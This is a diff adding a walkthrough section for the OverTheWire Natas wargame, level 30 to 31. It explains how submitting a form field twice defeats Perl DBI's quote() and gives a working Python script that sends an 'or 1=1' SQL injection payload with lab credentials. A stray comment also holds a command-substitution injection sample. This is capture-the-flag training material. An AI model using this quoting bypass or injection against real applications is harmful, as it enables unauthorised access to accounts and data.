@@ -991,8 +991,35 @@ This will get you the password for the next level.
 ### Natas Level 30 → Level 31
 **Key Takeaways**  
 
+* The app builds SQL with `$dbh->quote(param('...'))` which looks safe — but `param()` can return an array when a form field is submitted multiple times.
+* `quote()` accepts a second argument that controls quoting behavior; if that second value is an integer the DBD driver may skip normal string quoting.
+* Send the `password` field twice so `param('password')` becomes `["<payload>", 4]` (or other integer); the `4` gets passed to `quote()` and causes the quoting to be bypassed.
+* Make the first password value an SQL expression that makes authentication succeed, e.g. `"'lol' or 1=1"`, and set `username=natas31` to retrieve natas31's password.
+* POST the form with HTTP Basic auth (natas30 creds), parse the response — the page will include the natas31 password when the injection succeeds.
   
 **Procedure**
+
+1. Log in using the username `natas30` and the password from Level 29.
+
+2. Sample script (Credits: https://the-dark-lord.medium.com): https://the-dark-lord.medium.com/natas-wargames-16-30-fbde4edd41d4
+
+```
+import requests
+from requests.auth import HTTPBasicAuth
+
+#identified sample=^$(grep -o ^Wa natas16)I
+user='natas30'
+passw='WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH'
+
+#clumsy but manageable
+payload= {'username': 'natas31', 'password': ["'lol' or 1=1",4]}
+answer=requests.post('http://natas30.natas.labs.overthewire.org/index.pl', data=payload,auth=HTTPBasicAuth(user,passw))
+str1 = answer.text
+print(answer.text)
+```
+
+
+
 
 
 
